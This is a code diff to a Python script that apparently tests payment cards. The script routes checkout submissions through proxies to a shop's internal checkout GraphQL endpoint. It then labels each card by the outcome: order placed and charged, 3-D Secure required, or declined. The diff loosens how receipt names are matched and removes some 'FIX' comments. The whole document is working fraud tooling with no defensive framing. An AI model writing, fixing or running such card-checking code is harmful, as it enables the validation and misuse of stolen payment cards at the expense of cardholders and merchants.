@@ -227,7 +227,6 @@ def _is_shipping_required(b):
         return sp.get("isShippingRequired", True)
     except Exception: return True
 
-# ═══ FIX: RESTORED MISSING FUNCTIONS ═══
 def _delivery_handle(b):
     try:
         d = json.loads(b)
@@ -255,7 +254,6 @@ def _signed_handles(b):
             return [x["signedHandle"] for x in de.get("deliveryExpectations",[]) if x.get("signedHandle")]
     except Exception: pass
     return []
-# ═══════════════════════════════════════
 
 def _payment_method_id(b):
     try:
@@ -892,15 +890,17 @@ def _run_check(card_str, proxy_str):
         elapsed_ms = (time.monotonic() - t_start) * 1000
         log(f"Step 6: Submit Response -> {body[:200]}")
 
-        if '"ProcessedReceipt"' in body or '"SuccessfulReceipt"' in body:
+        # ═══ FIX: Changed to match without quotes ═══
+        if "ProcessedReceipt" in body or "SuccessfulReceipt" in body:
             return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=elapsed_ms)
-        if '"ActionRequiredReceipt"' in body:
+        if "ActionRequiredReceipt" in body:
             return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=elapsed_ms)
-        if '"FailedReceipt"' in body:
+        if "FailedReceipt" in body:
             resp, apv, chg = _classify_failed(_code(body))
             return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=elapsed_ms)
+        # ═══════════════════════════════════════════
 
-        if '"ProcessingReceipt"' in body:
+        if "ProcessingReceipt" in body:
             rid = _receipt_id(body)
             rss = _receipt_session(body)
             if rid and rss and remain() > 4:
@@ -915,13 +915,13 @@ def _run_check(card_str, proxy_str):
                         r_p = session.get(f"{shop_url}/checkouts/internal/graphql/persisted?{urlencode(params)}",
                                           headers=hdr, timeout=t_max(3))
                         pb = r_p.text
-                        if '"SuccessfulReceipt"' in pb or '"ProcessedReceipt"' in pb:
+                        if "SuccessfulReceipt" in pb or "ProcessedReceipt" in pb:
                             ms = (time.monotonic() - t_start) * 1000
                             return _resp("ORDER_PLACED", charged=True, price=price_str, elapsed_ms=ms)
-                        if '"ActionRequiredReceipt"' in pb:
+                        if "ActionRequiredReceipt" in pb:
                             ms = (time.monotonic() - t_start) * 1000
                             return _resp("3DS_AUTHENTICATION_REQUIRED", approved=True, price=price_str, elapsed_ms=ms)
-                        if '"FailedReceipt"' in pb:
+                        if "FailedReceipt" in pb:
                             resp, apv, chg = _classify_failed(_code(pb))
                             ms = (time.monotonic() - t_start) * 1000
                             return _resp(resp, approved=apv, charged=chg, price=price_str, elapsed_ms=ms)
